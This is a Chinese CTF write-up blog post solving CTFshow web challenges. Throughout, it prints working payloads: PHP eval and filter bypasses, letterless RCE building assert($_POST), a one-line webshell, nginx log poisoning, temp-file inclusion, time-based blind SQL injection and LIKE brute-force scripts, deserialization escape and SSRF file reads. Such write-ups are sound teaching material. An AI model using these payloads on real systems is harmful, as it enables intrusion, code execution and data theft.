title: CTFshow刷题记录
author: bmth
tags:
  - 刷题笔记
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304212214553.png'
date: 2020-11-01 15:21:00
---
## web_36D杯

### WEB_给你shell
打开题目首先F12，得到信息
![](https://img-blog.csdnimg.cn/2020050512585599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么`?view_source=`得到了源码：
```php
 <?php
//It's no need to use scanner. Of course if you want, but u will find nothing.
error_reporting(0);
include "config.php";

if (isset($_GET['view_source'])) {
    show_source(__FILE__);
    die;
}

function checkCookie($s) {
    $arr = explode(':', $s);
    if ($arr[0] === '{"secret"' && preg_match('/^[\"0-9A-Z]*}$/', $arr[1]) && count($arr) === 2 ) {
        return true;
    } else {
        if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);
        return false;
    }
}

function haveFun($_f_g) {
    $_g_r = 32;
    $_m_u = md5($_f_g);
    $_h_p = strtoupper($_m_u);    //strtoupper — 将字符串转化为大写
    for ($i = 0; $i < $_g_r; $i++) {
        $_i = substr($_h_p, $i, 1);
        $_i = ord($_i);
        print_r($_i & 0xC0);
    }
    die;
}

isset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{"secret":"' . strtoupper(md5('y1ng')) . '"}', time()+7200 );
checkCookie($json) ? $obj = @json_decode($json, true) : die('no');

if ($obj && isset($_GET['give_me_shell'])) {
    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo "here is your webshell: $shell_path";
}
die; 
```

三目运算符(expr1) \? (expr2) : (expr3) ：
表达式 (expr1) ? (expr2) : (expr3) 在 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3

代码逻辑如下：(师傅写的文章)
>- 有个名为secret的cookie，存的是json
>- checkCookie()函数要求这个json只有一对键值，并且不能有乱七八糟的其他符号
>- check过了就会json_decode()并且保存在\$obj里
>- 如果secret对应值和$flag_md5相等则给出shell，不等则调用haveFun()函数
>- haveFun()函数的for循环中用i和flag的md5按位&运算并输出结果

**弱类型**
需要比较`$obj['secret'] != $flag_md5`
`haveFun()`是做&运算，如果是数字和0xC0来&结果就是0，如果是字母则结果是64，即
```
1100 0000   0xC0
0100 0001   A
0101 1010   Z       与运算为0100 0000
0011 0000   0
0011 1001   9       与运算为0000 0000
```
![](https://img-blog.csdnimg.cn/20200512114015701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
根据返回的前3位是0可知是3位数的弱类型
**JSON伪造**
`$obj['secret']`是在cookie的JSON进行decode得到的，然而直接这样的JSON会返回字符串，不能用弱类型：
```php
{"secret":"100"}
正则匹配  /^[\"0-9A-Z]*}$/
```
正则直接将引号放到了`[]`里面，后面限定还是使用了星号，这意味着可以不使用双引号，对于没有双引号的话json_decode()就可以得到int了
`secret=%7B%22secret%22%3A§100§%7D`
![](https://img-blog.csdnimg.cn/20200512113449434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问w3b5HeLLlll123.php得到：
```php
 <?php
error_reporting(0);
session_start();

//there are some secret waf that you will never know, fuzz me if you can
require "hidden_filter.php";

if (!$_SESSION['login'])
    die('<script>location.href=\'./index.php\'</script>');

if (!isset($_GET['code'])) {
    show_source(__FILE__);
    exit();
} else {
    $code = $_GET['code'];
    if (!preg_match($secret_waf, $code)) {
        //清空session 从头再来
        eval("\$_SESSION[" . $code . "]=false;"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker
    } else die('hacker');
}
/*
 * When you feel that you are lost, do not give up, fight and move on.
 * Being a hacker is not easy, it requires effort and sacrifice.
 * But remember … we are legion!
 *  ————Deep CTF 2020
*/ 
```
过滤了：
- f、sys、include
- 括号、引号、分号
- ^ &等运算符
- 空格 / \ $ ` * #等符号

y1ng师傅分析如下：
>没括号 只能执行很少不需要括号的函数 比如echo “aaa”;
然后又没有引号 不能自己传值
还没有空格 执行函数的话必须后面直接接上东西
没有分号，很恶心
命令在`$_SESSION[' ']`里，还需要先逃逸出来
没有`$`和分号，命令拼接无效

师傅的playload：`?code=]=1?><?=require~%d0%99%93%9e%98%d1%8b%87%8b?>`
![](https://img-blog.csdnimg.cn/20200512120337253.png)
师傅的解释如下：
>首先用]=1来把session给闭合了
分号作为PHP语句的结尾，起到表示语句结尾和语句间分隔的作用，而对于php的单行模式是不需要分号的，因此用?><?来bypass分号
没有括号 使用那些不需要括号的函数 这里使用require
没有引号表示不能自己传参数，这里使用取反运算
由于PHP黑魔法 require和取反运算符之间不需要空格照样执行

最后取反/flag包含一下flag即可
![](https://img-blog.csdnimg.cn/20200512120820422.png)
```php
?code=]=1?><?=require~%d0%99%93%9e%98?>
```

### WEB_RemoteImageDownloader
考点：CVE-2019-17221、PhantomJS任意文件读取

买了服务器，可以抄wp了。。。
首先创建html写入以下代码：
```html
<html>
 <head>
 <body>
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
 document.write(this.responseText)
 };
 x.open("GET","file:///flag");
 x.send();
 </script>
 </body>
 </head>
</html>
```
然后点击Download即可得到flag
![](https://img-blog.csdnimg.cn/20200807223842442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：[FireShell CTF 2020 Writeup](https://www.gem-love.com/ctf/2127.html#Screenshoter%28469%29)

### WEB_你取吧
题目给出源码：
```php
<?php
error_reporting(0);
show_source(__FILE__);
$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');
$code=$_REQUEST['code'];
$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\~','\^');
$blacklist = array_merge($_);
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        die('nonono');
    }
}
eval("echo($code);");
?>
```
#### 非预期解1：
最后为`eval("echo($code);");`可以直接无字母数字的自增RCE，P神的payload
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
需要先把前面`echo()`给闭合了然后上Payload之后再把后面给闭合掉，最后为：
```php
?code=1);$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);(1
```
最后命令执行即可`_=system('cat /flag');`
![](https://img-blog.csdnimg.cn/20200508111642226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### 非预期解2：
没有限制我们用`$`和`[]`，直接用数组下标取出黑名单中的值,即`$_[0]=a,$_[1]=b`，那么可以用点号将单个字符连接构成相应的函数
最终我们需要的payload：`$__='system';$___='ls';$__($___);:`
师傅的拼接脚本：
```python
s=['a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\~','\^']
word=input()
code=''
for j in word:
        if j in s:
            code+='$_['+str(s.index(j))+'].'
        else:
            code+="'"+j+"'"+"."
print(code)
```
可以得到：
```php
system=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11]
ls=$_[13].$_[18]
cat=$_[2].$_[0].$_[19]
flag=$_[5].$_[13].$_[0].$_[6]
```
最后直接cat /flag：
`1);$__=$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___=$_[2].$_[0].$_[19].' '.'/'.$_[5].$_[13].$_[0].$_[6];$__($___);(1`

#### 预期解：
题中的代码给了\$hint，读取一下。
payload：`?code=${$_[7].$_[8].$_[12].$_[19]}`
![](https://img-blog.csdnimg.cn/20200508120046756.png)
那么即可下载压缩包，但得出来的是一个混淆后的php文件，大佬的解密php脚本：
```php
<?php
function decrypt($data, $key)
{
    $data_1 = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $ch = ord($data[$i]);
        if ($ch < 245) {
            if ($ch > 136) {
                $data_1 .= chr($ch / 2);
            } else {
                $data_1 .= $data[$i];
            }
        }
    }
    $data_1 = base64_decode($data_1);
    $key = md5($key);
    $j = $ctrmax = 32;
    $data_2 = '';
    for ($i = 0; $i < strlen($data_1); $i++) {
        if ($j <= 0) {
            $j = $ctrmax;
        }
        $j--;
        $data_2 .=  $data_1[$i] ^ $key[$j];
    }
    return $data_2;
}

function find_data($code)
{
    $code_end = strrpos($code, '?>');
    if (!$code_end) {
        return "";
    }
    $data_start = $code_end + 2;
    $data = substr($code, $data_start, -46);
    return $data;
}

function find_key($code)
{
    // $v1 = $v2('bWQ1');
    // $key1 = $v1('??????');
    $pos1 = strpos($code, "('" . preg_quote(base64_encode('md5')) . "');");
    $pos2 = strrpos(substr($code, 0, $pos1), '$');
    $pos3 = strrpos(substr($code, 0, $pos2), '$');
    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);
    $pos4 = strpos($code, $var_name, $pos1);
    $pos5 = strpos($code, "('", $pos4);
    $pos6 = strpos($code, "')", $pos4);
    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);
    return $key;
}

$input_file = $argv[1];
$output_file = $argv[1] . '.decrypted.php';

$code = file_get_contents($input_file);

$data = find_data($code);
if (!$code) {
    echo '未找到加密数据', PHP_EOL;
    exit;
}

$key = find_key($code);
if (!$key) {
    echo '未找到秘钥', PHP_EOL;
    exit;
}

$decrypted = decrypt($data, $key);
$uncompressed = gzuncompress($decrypted);
// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩
if ($uncompressed) {
    $decrypted = str_rot13($uncompressed);
} else {
    $decrypted = str_rot13($decrypted);
}
file_put_contents($output_file, $decrypted);
echo '解密后文件已写入到 ', $output_file, PHP_EOL;
```
用法：` php 该解密脚本 待解密的php文件`，得到：
![](https://img-blog.csdnimg.cn/20200508122341817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
为一句话木马：`@assert($_POST[6]);`蚁剑连接即可
![](https://img-blog.csdnimg.cn/20200508123153593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**最后看到还有个师傅按位或的，记录一下。**
在这张图表上，'@'|'(任何左侧符号)'=='(右侧小写字母)'
![](https://img-blog.csdnimg.cn/2020080722072453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

即`'@'|'!'=='a' `，那么 `('@@@@'|'().4')=='hint'`
最后`?code=($_ = '@@@@'|'().4') == 1?1:$$_`
[wh1sper：CTFshow 36D杯](http://wh1sper.cn/ctfshow-36d%E6%9D%AF/)
### WEB_WUSTCTF_朴实无华_Revenge
题目给出了源码：
```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

function isPalindrome($str){
    $len=strlen($str);
    $l=1;
    $k=intval($len/2)+1;
    for($j=0;$j<$k;$j++)
        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {
            $l=0;
            break;
        }
    if ($l==1) return true;
    else return false;
}

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    $numPositve = intval($num);
    $numReverse = intval(strrev($num));
    if (preg_match('/[^0-9.-]/', $num)) {
        die("非洲欢迎你1");
    }
    if ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧
        die("非洲欢迎你2");
    }
    if( $numPositve === $numReverse && !isPalindrome($num) ){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}

//level 2
if (isset($_GET['md5'])){
    $md5=$_GET['md5'];
    if ($md5==md5(md5($md5)))
        echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
    else
        die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("more", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("tail", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("less", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("head", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("tac", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("$", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("sort", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("curl", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("nc", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("bash", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("php", "36dCTFShow", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```
第一关需要传一个整数进去，但又有小数点，浮点精度问题。传进去的是回文又不是回文，是个矛盾判断，使用`100.0010`即可，最后是`!isPalindrome($num) `，在后面再加上一个0即可
![](https://img-blog.csdnimg.cn/20200505220614813.png)
payload：`?num=1000000000000000.00000000000000010 或 ?num=00.0`

第二关是md5碰撞`$md5==md5(md5($md5))`，使用师傅的脚本
```python
import hashlib

for i in range(0,10**33):
    i = str(i)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    md5 = hashlib.md5(md5.encode()).hexdigest()
    # print(md5)
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        if int(i) % 1000000 == 0:
         print(i)
```
得到`0e1138100474`
第三关命令执行，直接使用`\`即可绕过过滤
```php
?get_flag=ca\t</flag
?get_flag=rev</flag|rev
?get_flag=c\at%09/flag
```
![](https://img-blog.csdnimg.cn/20200505221740684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### WEB_ALL_INFO_U_WANT
首先得到`index.php.bak`
![](https://img-blog.csdnimg.cn/20200506103534774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
visit all_info_u_want.php and you will get all information you want

= =Thinking that it may be difficult, i decided to show you the source code:

<?php
error_reporting(0);

//give you all information you want
if (isset($_GET['all_info_i_want'])) {
    phpinfo();
}

if (isset($_GET['file'])) {
    $file = "/var/www/html/" . $_GET['file'];
    //really baby include
    include($file);
}

?>
really really really baby challenge right? 
```
访问`all_info_u_want.php?all_info_i_want=`即可获得phpinfo()的信息
![](https://img-blog.csdnimg.cn/20200506110949693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
#### 预期解1：
由http回包header得知是NGINX，那么直接可以包含日志文件
`all_info_u_want.php?file=../../../../../var/log/nginx/access.log`
但是因为url会被url编码，可以把一句话木马写在User-Agent，另外记得一定要闭合不然php执行会出错，包含即可RCE：
![](https://img-blog.csdnimg.cn/20200506122324953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
连上蚁剑即可获取flag
![](https://img-blog.csdnimg.cn/20200506122456287.png)
假的假的，需要找真flag，使用命令`find /etc -name "*" | xargs grep "flag{"`找到即可
#### 预期解2：
只要自身包含自身就进入了死循环，死循环要么被用户打断要么被nginx超时掉，php执行没有结束，临时文件就得以保存
另外，可以通过phpinfo()来看临时文件的位置，带上all_info_i_want参数来打开phpinfo，然后开始自身包含，写个上传表单：
```html
<html>
<form action="https://44ff57cf-cbbe-4ef5-a9c4-4ee656a6f814.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&all_info_i_want" method="post" enctype="multipart/form-data">
    <input type="file" name="filename">
    <input type="submit" value="提交">
</form>
</body>
</html>
```
上传后直接手工停掉他的死循环防止卡死，然后phpinfo里就能看到临时文件
![](https://img-blog.csdnimg.cn/20200508125603758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然候访问用蚁剑连接即可
![](https://img-blog.csdnimg.cn/20200508130006314.png)
### WEB_Login_Only_For_36D
F12得到了信息
```sql
if (!preg_match('/admin/', $uname)) die;
select * from 36d_user where username='$uname' and password='$passwd';
```
fuzz发现ban掉了：

1. 单引号
2. select substr等很多关键字
3. = > <
4. 空格 – ; |等符号

`admin\`把单引号注释掉让后面$passwd逃逸出去，直接上师傅的脚本
```python
import requests
import time as t

url = 'https://5bf6ae8e-105a-4a64-bb5c-80fc5fb8ff41.chall.ctf.show/index.php'
alphabet = ['a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']

data = {
    'username':'admin\\',
    'password':''
}

result = ''
for i in range(20):
    for char in alphabet:
        payload = 'or/**/if((password/**/regexp/**/binary/**/"^{}"),sleep(4),1)#'.format(result+char)
        data['password'] = payload
        #time
        start = int(t.time())
        r = requests.post(url, data=data)
        end = int(t.time()) - start

        if end >= 3:
            result += char
            print(result)
            break
        # else:
            # print(char)
            # print(r.text)
```
![](https://img-blog.csdnimg.cn/20200506141441478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用密码`ILoVeThlrtySixD`登录即可得到flag。~~hso~~
![](https://img-blog.csdnimg.cn/20200506141507269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

全文参考：
[Y1ng：CTFshow 36D Web Writeup](https://www.gem-love.com/ctf/2283.html)
[__羽__ ：CTFshow 36D杯 web系列](https://blog.csdn.net/miuzzx/article/details/105929357)

## web_月饼杯
### web1_此夜圆 
题目直接给出了源码：
```php
<?php
error_reporting(0);

class a
{
	public $uname;
	public $password;
	public function __construct($uname,$password)
	{
		$this->uname=$uname;
		$this->password=$password;
	}
	public function __wakeup()
	{
			if($this->password==='yu22x')
			{
				include('flag.php');
				echo $flag;	
			}
			else
			{
				echo 'wrong password';
			}
		}
	}

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```
发现需要`password=yu22x`就可以得到flag了，但默认为1，看到有个str_replace将字符串增加了2个，反序列化逃逸
```
正常序列化：O:1:"a":2:{s:5:"uname";s:0:"";s:8:"password";s:1:"1";}
我们需要的序列化：O:1:"a":2:{s:5:"uname";s:0:"";s:8:"password";s:5:"yu22x";}
需要构造为：O:1:"a":2:{s:5:"uname";s:0:"";s:8:"password";s:5:"yu22x";}";s:8:"password";s:1:"1";}
```
看到我们传入了39个字符，但实际上有41个字符，两个字符逃逸出来了，那么当全部逃逸出来时，即可满足反序列化
```php
$uname='Firebasky";s:8:"password";s:5:"yu22x";}';
$password=1;
```
![](https://img-blog.csdnimg.cn/20201005164454766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

即多出`";s:8:"password";s:5:"yu22x";}`，30个字符串，那么构造15个Firebasky即可
```php
?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```
![](https://img-blog.csdnimg.cn/20201005165026264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
看一下是否满足165个字符

![](https://img-blog.csdnimg.cn/20201005165059509.png#pic_center)
最后传入即可得到flag
![](https://img-blog.csdnimg.cn/20201005164019630.png#pic_center)
### web2_故人心 
提示：存在一个robots.txt
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a=$_GET['a'];
$b=$_GET['b'];
$c=$_GET['c'];
$url[1]=$_POST['url'];
if(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0){
    $d = ($b==hash("md2", $b)) && ($c==hash("md2",hash("md2", $c)));
    if($d){
             highlight_file('hint.php');
             if(filter_var($url[1],FILTER_VALIDATE_URL)){
                $host=parse_url($url[1]);
                print_r($host); 
                if(preg_match('/ctfshow\.com$/',$host['host'])){
                    print_r(file_get_contents($url[1]));
                }else{
                    echo '差点点就成功了！';
                }
            }else{
                echo 'please give me url!!!';
            }     
    }else{
        echo '想一想md5碰撞原理吧?!';
    }
}else{
    echo '第一个都过不了还想要flag呀?!';
}
```

**第一关 ：**
```php
(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0)
```
不会，看wp发现可以使用`1e-162`，最后发现在-323到-162之间的都可以
![](https://img-blog.csdnimg.cn/20201005171537403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
**第二关：**
```php
($b==hash("md2", $b)) && ($c==hash("md2",hash("md2", $c)))
```
md2碰撞，由于robots.txt给了提示，直接上脚本跑即可
![](https://img-blog.csdnimg.cn/20201005165805762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)这里是airrudder师傅的脚本
```php
<?php
/*	//直接爆破
for ($i=100000000; $i < 10000000000; $i++) {
	$b=hash("md2", '0e'.$i);
	if(is_numeric($b) && substr($b,0,2)==='0e'){
		echo '$i = ';echo $i;
		echo '$b = ';echo $b;
	}

	$c=hash("md2",hash("md2", '0e'.$i));
	if(is_numeric($c) && substr($c,0,2)==='0e'){
		echo '$i = ';echo $i;
		echo '$c = ';echo $c;
	}
}
*/

for ($i=0; $i < 999999; $i++) { 
	$b=hash("md2", '0e'.$i.'024452');
	if(is_numeric($b) && substr($b,0,2)==='0e'){
		echo '$i = ';echo $i;
		echo '$b = ';echo $b;
	}

	$c=hash("md2",hash("md2", '0e'.$i.'48399'));
	if(is_numeric($c) && substr($c,0,2)==='0e'){
		echo '$i = ';echo $i;
		echo '$c = ';echo $c;
	}
}
?>
```

得到`b=0e652024452，c=0e603448399`

![](https://img-blog.csdnimg.cn/20201005184019758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

**第三关：**
没有什么思路，看wp又学到了一招：php遇到不认识的协议就会当目录处理

考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF
php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。
[ssrf绕过filter_var函数使用file_get_contents读取任意文件](https://blog.csdn.net/qq_46091464/article/details/108570212)

payload：`url=a://ctfshow.com/../../../../../../../fl0g.txt`
![](https://img-blog.csdnimg.cn/20201005185326531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
### web3_莫负婵娟 
提示：环境变量 +linux字符串截取 + 通配符

首先拿到题目是一个登录界面，查看源码得到信息：
![](https://img-blog.csdnimg.cn/20201005190440945.png#pic_center)
>发现是like模糊查询，可以使用`%`匹配多个字符，`_`匹配单个字符。
尝试后发现`%`被过滤，不过下划线`_`并没有被过滤。
这里就需要猜测password的位数了，最后爆出密码有32位。如果小于或大于32个_都会报wrong username or password。只有正确匹配才会显示I have filtered all the characters. Why can you come in? get out!

![](https://img-blog.csdnimg.cn/20201005191041136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)使用师傅写的脚本跑：
```python
import requests
import string

strs = string.digits+string.ascii_letters
url = 'http://01a0d419-a06a-48de-b123-a27b8703807e.chall.ctf.show/login.php'

pwd = ''
for i in range(32):
	print('i = '+str(i+1),end='\t')
	for j in strs:
		password = pwd + j + (31-i)*'_'
		data = {'username':'yu22x','password':password}
		r = requests.post(url,data=data)
		if 'wrong' not in r.text:
			pwd += j
			print(pwd)
			break
```

![](https://img-blog.csdnimg.cn/20201005191305624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
得到密码`67815b0c009ee970fe4014abaa3Fa6A0`，登录进入，发现

![](https://img-blog.csdnimg.cn/20201005191616814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
`Normal connection`表示正常连接
